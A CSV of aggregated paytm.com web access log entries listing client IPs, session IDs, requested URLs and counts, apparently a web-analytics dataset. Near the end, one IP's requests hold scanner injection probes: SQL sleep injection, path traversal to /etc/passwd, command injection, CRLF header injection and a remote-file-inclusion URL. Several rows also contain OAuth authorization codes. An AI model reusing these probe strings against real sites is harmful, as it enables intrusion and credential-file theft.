clientIp,sessionId,request,count(request)
182.66.22.172,53,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
202.54.152.130,55,https://paytm.com:443/,1
207.244.77.232,57,https://paytm.com:443/offer/wp-content/uploads/2015/07/autom.jpg,1
210.212.192.18,59,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21786&channel=web&version=2,1
223.176.2.208,62,https://paytm.com:443/papi/v1/expresscart/verify,1
49.201.91.193,69,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/style.css?ver=4.2.2,1
49.201.99.165,69,https://paytm.com:443/shop/cart?channel=web&version=2,1
49.206.112.151,69,https://paytm.com:443/papi/rr/products/13828553/statistics?channel=web&version=2,1
1.23.86.192,0,https://paytm.com:443/shop/h/electronics?utm_term=1,2
103.245.10.27,9,https://paytm.com:443/shop/log,4
103.9.13.240,11,https://paytm.com:443/myorders,2
106.204.103.204,13,https://paytm.com:443/shop/cart,2
106.215.169.56,13,https://paytm.com:443/styles/css/notification.css,1
113.193.216.186,22,https://paytm.com:443/offer/wp-content/uploads/2015/07/julqw.jpg,1
113.193.216.186,22,https://paytm.com:443/offer/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4,1
115.187.56.68,24,https://paytm.com:443/offer/wp-includes/js/comment-reply.min.js?ver=4.2.2,1
115.96.72.57,24,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
117.195.226.249,28,https://paytm.com:443/shop/action,1
117.199.172.166,28,https://paytm.com:443/shop/cart,1
119.82.116.62,35,https://paytm.com:443/papi/nps/merchantrating?merchant_id=40006&channel=web&version=2,1
120.56.171.24,35,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.0.3,1
122.176.63.248,40,https://paytm.com:443/shop,1
128.185.234.75,42,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
14.139.241.194,42,https://paytm.com:443/papi/nps/merchantverification,1
14.139.241.194,43,https://paytm.com:443/offer/wp-content/uploads/2015/07/ledq.jpg,1
14.96.119.18,46,https://paytm.com:443/bus-tickets?utm_source=affiliates&utm_medium=dgm&utm_campaign=dgm-generic&utm_term=65666,1
182.70.245.191,52,https://paytm.com:443/shop/cart?channel=web&version=2,1
182.72.127.166,52,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20,1
182.73.67.218,52,https://paytm.com:443/shop/orderdetail/1116557008?channel=web&version=2,2
202.83.16.251,58,https://paytm.com:443/shop/cart?channel=web&version=2,1
210.56.103.198,65,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/wonderplugincarousel.js?ver=3.8,1
216.178.109.87,65,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.carousel.min.css?ver=2.0.0,1
49.204.63.89,82,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
49.204.63.89,82,https://paytm.com:443/offer/wp-content/uploads/2015/07/bedlinen.jpg,1
59.88.216.48,83,https://paytm.com:443/?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff3-E,3
8.37.224.249,93,https://paytm.com:443/offer/wp-content/plugins/wp-thumbnail-slider/css/wpt-slide.css?ver=4.2.2,1
8.37.224.249,93,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/style.css?ver=4.2.2,1
106.76.243.77,5,https://paytm.com:443/shop/cart,1
107.167.109.137,5,http://www.paytm.com:80/,1
115.99.1.4,21,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
116.203.130.208,21,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
117.194.216.99,23,https://paytm.com:443/,1
121.241.218.132,30,https://paytm.com:443/papi/nps/merchantrating?merchant_id=26848&channel=web&version=2,1
122.163.11.204,34,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/css/images-thumbnail-sliderv1-style.css?ver=4.2.2,1
122.173.225.73,34,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=Payoom&utm_campaign=Payoom,2
124.253.238.229,35,https://paytm.com:443/shop/cart,2
14.139.157.28,40,https://paytm.com:443/shop/g/paytm-home/exclusive-discount-deals,1
14.97.116.62,46,https://paytm.com:443/recharge,1
180.151.180.21,52,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=VCOMM&utm_campaign=VCOMM&utm_term=32058,1
182.68.243.157,55,https://paytm.com:443/shop/g/women/clothes-western/tops-tunics,1
193.202.110.180,58,http://paytm.com:80/shop/g/men/watches/men-watch-store/c1/fastrack-watches-flat-20-off,2
223.196.182.244,70,https://paytm.com:443/shop/logout?channel=web&version=2,1
59.181.108.176,79,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
66.102.6.250,82,https://paytm.com:443/shop/g/women/clothes-indian-ethnic/sarees-blouse,1
1.187.236.169,0,https://paytm.com:443/shop,2
103.36.251.10,10,https://paytm.com:443/offer/wp-includes/js/jquery/ui/button.min.js?ver=1.11.4,1
106.192.171.115,13,https://paytm.com:443/blog/wp-content/plugins/jetpack/modules/sharedaddy/sharing.js?ver=3.5.3,1
106.78.8.94,16,https://paytm.com:443/shop/cart,2
111.119.205.203,18,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,3
115.242.152.184,22,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
117.234.163.69,24,https://paytm.com:443/papi/nps/merchantrating?merchant_id=20272&channel=web&version=2,1
117.251.233.236,24,https://paytm.com:443/shop/user/preferences,2
122.162.165.71,31,https://paytm.com:443/papi/v1/promosearch/product/13342503/offers?parent_id=13342695&price=2500&channel=web&version=2,1
123.236.193.207,31,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.0.3,1
125.99.130.104,34,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=VCOMM&utm_campaign=VCOMM&utm_term=32178,1
15.219.201.69,41,https://paytm.com:443/offer/wp-content/uploads/2015/07/pesoal.jpg,1
180.151.197.114,48,https://paytm.com:443/bus/%7B%7B::resourceUrl%7D%7D/images/transparent.gif,1
180.151.197.114,48,https://paytm.com:443/images/transparent.gif,1
182.65.200.127,50,https://paytm.com:443/shop/cart?channel=web&version=2,1
182.74.18.112,54,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/wonderplugincarouselskins.js?ver=3.8,1
182.74.18.112,54,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/js/l-box-js.js?ver=4.2.2,1
202.153.46.246,58,https://paytm.com:443/shop/p/value-retail-steel-airtight-3-pc-lock-steel-lunch-tiffin-box-with-insulated-bag-HOTHRS0000VR1023VRBLFR,1
220.226.191.107,63,https://paytm.com:443/images/greyStar.png,1
223.225.252.221,64,https://paytm.com:443/shop/p/spykar-blue-denim-slim-fit-jeans-size-30-APPSPYKAR-BLUE-YOUR21247F53806FB,1
42.106.175.153,73,https://paytm.com:443/styles/app.css,1
60.243.212.212,77,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20,1
60.243.212.212,77,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
61.0.174.14,77,https://paytm.com:443/shop/logout?channel=web&version=2,2
1.23.128.2,1,https://paytm.com:443/care,1
1.39.9.108,4,https://paytm.com:443/shop/cart,1
106.76.9.218,9,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
107.167.109.1,15,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.transitions.css?ver=4.2.2,1
112.79.36.124,20,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/images/vl-box/controls.png,1
117.235.31.80,28,https://paytm.com:443/shop/orderhistory/search?pagesize=10&key=9446849229&channel=web&version=2,1
117.96.230.62,31,https://paytm.com:443/shop/summary/1116234617,1
120.56.146.107,31,https://paytm.com:443/offer/wp-includes/js/jquery/ui/button.min.js?ver=1.11.4,1
120.56.146.107,31,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/js/jc.js?ver=4.2.2,1
14.99.94.18,46,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/js/script.js?ver=4.2.2,1
203.91.215.55,73,https://paytm.com:443/blog/wp-content/uploads/2015/03/4523_860_8511.jpg,1
49.207.247.167,79,https://paytm.com:443/papi/v1/promosearch/product/14809958/offers?parent_id=0&price=495&channel=web&version=2,1
59.160.74.254,81,https://paytm.com:443/offer/wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4,1
8.37.224.131,81,https://paytm.com:443/offer/wp-content/themes/twentytwelve/js/navigation.js?ver=20140318,1
8.37.226.226,84,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/accordion.js?ver=1,2
103.15.249.113,17,https://paytm.com:443/shop/logout?channel=web&version=2,1
103.38.246.7,29,https://paytm.com:443/shop,6
103.8.194.117,33,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/js/owl.carousel.js?ver=4.2.2,1
106.51.143.174,34,https://paytm.com:443/shop/ad/paytmAd?cat=bus1&paytm=new,1
106.76.21.173,34,https://paytm.com:443/offer/wp-content/uploads/2015/07/bedlinen.jpg,1
106.79.2.132,34,https://paytm.com:443/shop/logout,1
115.242.79.157,49,https://paytm.com:443/shop,1
117.213.170.8,53,https://paytm.com:443/papi/v1/promosearch/product/6914883/offers?parent_id=6915039&price=4299&channel=web&version=2,1
117.239.91.155,53,https://paytm.com:443/offer/wp-content/uploads/2015/07/julqw.jpg,1
117.240.186.11,53,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
119.151.36.63,55,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
122.180.168.171,61,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/slider-plus-lightbox-style.css?ver=4.2.2,1
122.183.197.26,63,https://paytm.com:443/papi/nps/merchantrating?merchant_id=41988&channel=web&version=2,1
124.123.61.52,69,https://paytm.com:443/shop/cart?channel=web&version=2,1
125.17.82.14,70,https://paytm.com:443/shop/orderdetail/1116224707?channel=web&version=2,1
150.129.126.58,80,https://paytm.com:443/favicon.ico,1
168.235.195.31,83,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/js/owl.carousel.js?ver=4.2.2,1
168.235.198.169,83,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/flexslider/flexslider.css?ver=2.2.0,1
175.101.68.24,87,https://paytm.com:443/papi/v1/promosearch/product/16476164/offers?parent_id=16476775&price=1887&channel=web&version=2,1
182.73.71.194,91,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/css/images-responsive-thumbnail-slider-plus-lighbox-style.css?ver=4.2.2,1
203.200.180.42,96,https://paytm.com:443/papi/rr/products/9928868/statistics?channel=web&version=2,1
223.226.29.237,108,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
59.145.102.130,113,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/js/jquery.flexslider-min.js?ver=4.2.2,1
61.2.23.83,116,https://paytm.com:443/shop/g/electronics/the-electronic-store/ces-offer-on-pen-drives?sort_price=0&utm_source=affiliates&utm_medium=dgm&utm_campaign=dgm-generic&utm_term=50176,1
101.63.199.139,8,https://paytm.com:443/shop/p/butterflies-cream-pu-clutch-WCLTCHBNS2332CRMBFCRFR,1
106.208.248.63,9,https://paytm.com:443/papi/nps/merchantrating?merchant_id=58804&channel=web&version=2,1
106.77.13.96,9,https://paytm.com:443/online-prepaid-dishtv-dth-recharge.htm,1
117.214.14.129,22,https://paytm.com:443/offer/wp-content/uploads/2015/07/cc.png,1
117.214.14.129,22,https://paytm.com:443/offer/wp-content/uploads/2015/07/meruwer_1.jpg,1
117.220.73.142,22,https://paytm.com:443/shop/cart?channel=web&version=2,4
117.230.9.139,22,https://paytm.com:443/papi/nps/merchantrating?merchant_id=20780&channel=web&version=2,1
122.177.118.210,31,https://paytm.com:443/shop/p/nikon-d3200-with-af-s-18-55-mm-vr-lens-24-2-mp-dslr-camera-black-NIKON_D3200_04_BLACK_29463?utm_source=affiliates&utm_medium=buyhatke&utm_campaign=buyhatke-generic,1
125.19.44.195,37,https://paytm.com:443/papi/rr/products/7298154/statistics?channel=web&version=2,1
125.19.44.195,37,https://paytm.com:443/papi/v1/promosearch/product/8211696/offers?parent_id=8211637&price=3723&channel=web&version=2,2
125.19.44.195,38,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
144.36.228.41,49,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.carousel.min.css?ver=2.0.0,1
164.100.80.37,50,https://paytm.com:443/favicon.ico,1
168.235.197.197,55,https://paytm.com:443/blog/wp-content/plugins/jetpack/modules/related-posts/related-posts.js?ver=20150408,1
168.235.197.197,55,https://paytm.com:443/blog/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
168.235.197.197,55,https://paytm.com:443/blog/the-all-new-paytm-cash-wallet-for-you/,1
182.66.54.26,67,https://paytm.com:443/shop/summary/1117858925,1
223.196.166.32,81,https://paytm.com:443/shop/cart,1
49.202.200.20,83,https://paytm.com:443/,1
59.91.111.150,95,https://paytm.com:443/shop/p/samsung-galaxy-a7-gold-MOBSAMSUNG-GALADUMM1416305BE7_36595,1
101.57.74.210,7,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
103.16.71.67,7,https://paytm.com:443/papi/v1/promosearch/product/5604128/offers?parent_id=5604306&price=435&channel=web&version=2,2
103.24.20.142,13,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=VCOMM&utm_campaign=VCOMM&utm_term=24890,1
107.167.109.134,29,https://paytm.com:443/offer/wp-content/themes/twentytwelve/style.css?ver=4.2.2,2
115.241.52.13,34,https://paytm.com:443/offer/wp-content/themes/twentytwelve/js/navigation.js?ver=20140318,1
116.203.77.44,34,https://paytm.com:443/papi/v1/expresscart/verify,1
116.203.77.44,34,https://paytm.com:443/,1
117.220.193.15,35,https://paytm.com:443/shop/p/shopper52-imported-mini-sewing-machine-with-foot-pedal-HOMSHOPPER52-IMSURY30747B09FB4D4,1
120.59.205.170,37,https://paytm.com:443/shop/orderhistory?before_id=1088281856&pagesize=10,1
121.241.127.1,39,https://paytm.com:443/papi/nps/merchantrating?merchant_id=25914&channel=web&version=2,1
122.15.30.49,40,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.0.3,1
122.173.17.77,41,https://paytm.com:443/shop/authresponse?code=e710f630-e34f-485d-b40b-0bfc8120b6c3&state=,1
123.136.168.186,41,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
123.239.82.61,41,https://paytm.com:443/shop/ad/paytmAd?cat=bus1&paytm=new,1
124.30.240.34,42,https://paytm.com:443/offer/wp-includes/js/comment-reply.min.js?ver=4.2.2,1
125.19.58.217,42,https://paytm.com:443/offer/wp-includes/js/jquery/ui/accordion.min.js?ver=1.11.4,1
171.51.223.245,54,https://paytm.com:443/,1
216.10.193.22,68,https://paytm.com:443/papi/v1/promosearch/product/6356337/offers?parent_id=6356354&price=2676&channel=web&version=2,1
37.228.107.226,75,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/slider-plus-lightbox-style.css?ver=4.2.2,2
37.228.107.4,77,https://paytm.com:443/shop/p/philips-qt4000-trimmer-for-men-cmplxphilips_qt4000_null_null,1
49.207.185.199,80,https://paytm.com:443/offer/wp-content/uploads/2015/07/offer-page_20jul.jpg,1
1.22.22.59,2,https://paytm.com:443/papi/nps/merchantrating?merchant_id=48103&channel=web&version=2,2
106.220.228.153,8,https://paytm.com:443/shop/login?isIframe=true&theme=mp-html5,1
106.51.242.239,10,https://paytm.com:443/papi/v1/promosearch/product/11128649/offers?parent_id=4299598&price=20990&channel=web&version=2,1
106.76.75.244,10,https://paytm.com:443/papi/v1/expresscart/verify,1
115.251.231.142,19,https://paytm.com:443/shop/p/dealfiza-blue-georgette-semi-stitched-suit-APPDEALFIZA-BLUSANT4870183D4C6B6,1
117.218.12.14,23,https://paytm.com:443/papi/v1/expresscart/verify,1
117.222.183.126,23,https://paytm.com:443/shop/g/home-kitchen/the-home-store/towel-extra-40-off?gclid=CLCul5PL7sYCFRMJvAodCFMAlw,1
120.63.197.63,26,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/js/jquery.flexslider-min.js?ver=4.2.2,1
14.139.245.2,34,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.transitions.css?ver=4.2.2,1
168.235.197.210,54,https://paytm.com:443/?utm_source=ucweb&utm_medium=Affiliate&utm_campaign=web,1
182.74.22.42,66,https://paytm.com:443/shop/cart/checkout?channel=web&version=2,1
183.82.16.7,66,https://paytm.com:443/papi/v1/promosearch/product/6855788/offers?parent_id=6856192&price=225&channel=web&version=2,1
203.129.195.130,70,https://paytm.com:443/offer/wp-includes/js/masonry.min.js?ver=3.1.2,1
223.176.52.3,74,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/js/jc.js?ver=4.2.2,1
223.176.52.3,74,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
72.46.139.242,85,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
86.190.115.53,86,https://paytm.com:443/shop/cart?channel=web&version=2,1
103.232.131.49,7,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
103.50.82.45,10,https://paytm.com:443/papi/v1/promosearch/product/16701693/offers?parent_id=13214015,1
106.208.81.243,10,https://paytm.com:443/offer/wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4,1
106.51.227.237,11,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
111.92.6.144,17,https://paytm.com:443/shop/cart,2
117.214.226.170,28,https://paytm.com:443/papi/v1/promosearch/product/13179392/offers?parent_id=16348917&price=1399&channel=web&version=2,1
117.222.226.32,28,https://paytm.com:443/?gclid=CMD6jLvE7sYCFZcnvQodL-UGqQ,1
117.229.175.16,28,https://paytm.com:443/papi/nps/merchantrating?merchant_id=30711&channel=web&version=2,2
122.164.220.99,33,https://paytm.com:443/shop/cart?channel=web&version=2,1
122.171.215.98,33,https://paytm.com:443/shop/authresponse?code=3f4553aa-970b-42e7-8d1f-99cdc9846708,1
175.101.8.146,59,https://paytm.com:443/shop/g/women/lists-store/funtastic-friday-jewellery-flat-50-cashback?gclid=Cj0KEQjw_rytBRDVhZeQrbzn_q0BEiQAjnbSHBQwmtZ6rXH-fS-JvTJ83BlQyCKxuhPbqMeeC-p0Ks0aAq-B8P8HAQ,1
194.251.119.198,61,https://paytm.com:443/scripts/common/config/ConstantsConfig.js,1
221.120.106.113,64,https://paytm.com:443/papi/v1/promosearch/product/10940033/offers?parent_id=17602075&price=499&channel=web&version=2,1
59.180.139.58,74,https://paytm.com:443/offer/wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4,1
70.39.185.117,75,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/flexslider/flexslider.css?ver=2.2.0,1
70.39.187.151,75,https://paytm.com:443/login,1
1.39.61.220,3,https://paytm.com:443/papi/v1/expresscart/verify,5
101.63.144.196,5,https://paytm.com:443/shop/logout?channel=web&version=2,1
107.167.108.94,12,https://paytm.com:443/styles/app.css,1
112.133.233.143,16,https://paytm.com:443/shop/cart?channel=web&version=2,1
112.196.47.251,16,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/slider-plus-lightbox-style.css?ver=4.2.2,1
115.245.160.8,22,https://paytm.com:443/papi/v1/promosearch/product/12601379/offers?parent_id=12601804,1
117.213.57.228,25,https://paytm.com:443/shop/g/books-media-stationery/stationery/paper-products-diaries-notebook/notebooks?utm_source=affiliate&utm_medium=innovativelead&utm_campaign=innovativelead-generic&utm_term=26,1
117.244.157.149,29,https://paytm.com:443/shop/summary/1116572725,1
14.141.73.242,35,https://paytm.com:443/shop/logout?channel=web&version=2,1
182.71.29.116,40,https://paytm.com:443/papi/nps/merchantrating?merchant_id=23248&channel=web&version=2,1
203.91.192.4,45,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/css/images-thumbnail-sliderv1-style.css?ver=4.2.2,2
210.89.60.185,51,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.theme.default.css?ver=2.0.0,1
37.228.104.69,53,https://paytm.com:443/offer/wp-includes/js/jquery/jquery.masonry.min.js?ver=3.1.2,1
37.228.104.69,53,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
45.64.220.177,57,https://paytm.com:443/offer/wp-includes/js/jquery/ui/accordion.min.js?ver=1.11.4,1
49.244.209.216,57,http://m.paytm.com:80/indexApp.htm,1
49.248.218.202,57,https://paytm.com:443/shop/cart?channel=web&version=2,1
103.252.24.96,6,https://paytm.com:443/scripts/web/angular-datepicker.js,1
112.133.229.99,10,https://paytm.com:443/shop/g/electronics/the-electronic-store/ces-offer-on-pen-drives?sort_price=0&utm_source=affiliates&utm_medium=dgm&utm_campaign=dgm-generic&utm_term=50176,3
117.205.176.181,17,https://paytm.com:443/shop/orderdetail/1117869202?channel=web&version=2,1
117.207.194.65,17,https://paytm.com:443/papi/rr/products/8212249/statistics?channel=web&version=2,1
117.211.28.154,17,https://paytm.com:443/shop/log,1
117.239.51.81,18,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
117.253.223.152,19,https://paytm.com:443/shop/cart?channel=web&version=2,1
120.57.146.46,20,https://paytm.com:443/shop/p/w-white-viscose-top-CMPLXAPPW-WHITE-VISCFASH20344D0EB817F,1
124.123.201.6,22,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
141.0.11.192,31,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.carousel.css?ver=4.2.2,1
141.0.11.192,31,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.0.3,1
202.65.139.70,42,https://paytm.com:443/api/oauth2/user/clients?channel=web&version=2,3
203.143.186.45,49,https://paytm.com:443/papi/v1/promosearch/product/16398609/offers?parent_id=16399286&price=1279&channel=web&version=2,1
213.105.235.192,52,https://paytm.com:443/papi/v1/promosearch/product/9165849/offers?parent_id=0&price=187&channel=web&version=2,1
49.15.95.19,60,https://paytm.com:443/offer/wp-content/uploads/2015/07/logo13.gif,1
49.156.76.41,60,https://paytm.com:443/shop/cart,2
49.32.0.172,61,https://paytm.com:443/shop/cart?channel=web&version=2,1
59.179.55.111,65,https://paytm.com:443/papi/v1/expresscart/verify,2
70.39.186.58,65,https://paytm.com:443/?utm_source=ucweb&utm_medium=Affiliate&utm_campaign=web,1
1.22.122.38,1,https://paytm.com:443/offer/wp-content/uploads/2015/07/kitch11.jpg,1
1.23.98.110,1,https://paytm.com:443/shop/action,1
1.39.34.3,2,https://paytm.com:443/offer/wp-includes/js/jquery/ui/button.min.js?ver=1.11.4,1
1.39.34.3,2,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,1
100.43.81.132,6,https://paytm.com:443/shop/p/shree-red-cotton-leggings-size-s-APPSHREE-RED-COFASH203447D6575A6,1
106.216.154.61,13,https://paytm.com:443/shop/h/books,1
112.79.35.75,16,https://paytm.com:443/shop/cart?channel=web&version=2,1
115.242.140.128,21,https://paytm.com:443/shop/cart?channel=web&version=2,1
117.210.102.102,26,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=Payoom&utm_campaign=Payoom,2
117.238.63.54,29,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/js/jquery.flexslider-min.js?ver=4.2.2,1
120.60.32.3,30,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.theme.default.css?ver=2.0.0,1
120.60.32.3,30,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/images/vl-box/controls.png,1
122.175.235.219,36,https://paytm.com:443/papi/nps/merchantrating?merchant_id=25651&channel=web&version=2,2
123.63.142.186,37,https://paytm.com:443/papi/v1/promosearch/product/10944805/offers?parent_id=0&price=243&channel=web&version=2,1
125.17.16.146,41,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
14.96.83.91,48,https://paytm.com:443/shop/cart?channel=web&version=2,3
182.70.132.21,54,https://paytm.com:443/papi/v1/expresscart/verify,1
202.153.41.35,56,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/magnific-popup.css?ver=0.9.9,1
203.147.88.34,60,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.theme.default.css?ver=2.0.0,1
203.92.41.146,64,https://paytm.com:443/shop/g/baby-kids-toys/toys-games/ride-ons-scooter-skates,1
43.252.34.136,77,https://paytm.com:443/shop/authresponse?code=46906a7e-68ff-4c25-b510-1d2138bcd518,1
49.204.86.132,80,https://paytm.com:443/shop/orderdetail/1117861486?channel=web&version=2,1
101.222.234.154,0,https://paytm.com:443/papi/v1/promosearch/product/13340828/offers?parent_id=13340832&price=349&channel=web&version=2,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/upto-rs%27%20and%20sleep%284%29%3d%27-60-off,1
106.51.132.54,7,https://paytm.com:443/shop/g/paytm-home/%3bprint%28md5%28acunetix_wvs_security_test%29%29%3b,1
106.51.132.54,7,https://paytm.com:443/offer/greencart/?src=http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt%3f%2500.jpg,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/big-day-kitchen-extra-60-off-on-external-hard-disk-drive%27%3dsleep%284%29%3d%27,1
106.51.132.54,7,https://paytm.com:443/shop/1%27%22/books-media-stationery/stationery,1
106.51.132.54,7,https://paytm.com:443/shop/................windowswin.ini/brand-store/sports-fitness,1
106.51.132.54,7,https://paytm.com:443/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd/termsconditions/,1
106.51.132.54,7,https://paytm.com:443/offer/greencart/?src=1e309,1
106.51.132.54,7,https://paytm.com:443/%22%26dir%26%22/about/,1
106.51.132.54,7,https://paytm.com:443/shop/h/%22%26cat%20%2fetc%2fpasswd%26%22/sports-fitness,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/big-day-kitchen-extra-60-%27%7c%27ld,1
106.51.132.54,7,https://paytm.com:443/shop/g/%bf%27%bf%22/home-and-kitchen-appliances,1
106.51.132.54,7,https://paytm.com:443/%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_wvs/termsconditions/,1
106.51.132.54,7,https://paytm.com:443/file%3a%2f%2f%2fetc%2fpasswd/about/,1
106.51.132.54,7,https://paytm.com:443/shop/g/electronics/the-electronic-store/upto-rs-1000%20and%20sleep%284%29%20-off-on-external-hard-disk-drive,1
106.51.132.54,7,https://paytm.com:443/offer/%2f%2fwww.acunetix.tst/,1
108.171.132.166,11,https://paytm.com:443/shop/p/style-amaze-green-georgette-semi-stitched-suit-APPSTYLE-AMAZE-STYL360589AE10C83,1
